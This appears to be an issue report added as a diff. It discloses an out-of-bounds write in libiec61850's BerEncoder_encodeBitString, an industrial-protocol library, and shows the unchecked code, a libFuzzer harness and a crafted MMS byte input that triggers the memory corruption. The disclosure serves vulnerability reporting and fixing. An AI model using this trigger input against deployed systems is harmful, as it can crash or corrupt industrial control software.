@@ -1,0 +1,78 @@
+issue #516
+
+Summary
+An Out-of-Bound Write vulnerability was discovered in the BerEncoder_encodeBitString function of the ber_encoder.c file in the libiec61850 library through fuzzing. This vulnerability is triggered when encoding the MMS_BIT_STRING type MmsData.
+
+Details
+The vulnerability occurs in the BerEncoder_encodeBitString function when processing the bit string data. When the bufPos index used to write to the output buffer is not properly validated, it leads to an out-of-bounds write.
+Let's consider the following code:
+
+libiec61850/src/mms/asn1/ber_encoder.c
+
+Lines 128 to 148 in 7afa403
+
+ int 
+ BerEncoder_encodeBitString(uint8_t tag, int bitStringSize, uint8_t* bitString, uint8_t* buffer, int bufPos) 
+ { 
+     buffer[bufPos++] = tag; 
+  
+     int byteSize = bitStringSize / 8; 
+  
+     if (bitStringSize % 8) 
+         byteSize++; 
+  
+     int padding = (byteSize * 8) - bitStringSize; 
+  
+     bufPos = BerEncoder_encodeLength(byteSize + 1, buffer, bufPos); 
+  
+     buffer[bufPos++] = padding; 
+  
+     int i; 
+  
+     for (i = 0; i < byteSize; i++) { 
+         buffer[bufPos++] = bitString[i]; 
+     } 
+The function writes the encoded bit string data to the buffer starting at the bufPos index. However, there is no proper boundary check to ensure that bufPos does not exceed the valid range of the buffer. As a result, if the bitStringSize is large enough or if the bufPos is already close to the end of the buffer, an out-of-bounds write can occur.
+
+
+PoC
+A proof-of-concept exploit has been provided in the attached file. This PoC demonstrates how the vulnerability can be triggered by sending specially crafted input data to the affected functions.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include "iec61850_server.h"
+#include "hal_thread.h"
+#include "lib_memory.h"
+
+int LLVMFuzzerTestOneInput(const char *data, size_t size) {
+    int out;
+    MmsValue* mmsValue = NULL;
+    mmsValue = MmsValue_decodeMmsData(data, 0, size, &out);
+    if (mmsValue == NULL) {
+        return 0;
+    }
+
+    int dataSize = MmsValue_encodeMmsData(mmsValue, NULL, 0, false);
+    if (dataSize <= 0) {
+        return 0;
+    }
+    
+    uint8_t *mmsBuffer = (uint8_t *)GLOBAL_MALLOC(dataSize);
+    if (mmsBuffer == NULL) {
+        return 0;
+    }
+
+    MmsValue_encodeMmsData(mmsValue, mmsBuffer, 0, true);
+    
+    GLOBAL_FREEMEM(mmsBuffer);
+
+    if (mmsValue != NULL) {
+        MmsValue_delete(mmsValue);
+    }
+
+    return 0;
+}
+
+<84><81><80><00><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30>
+
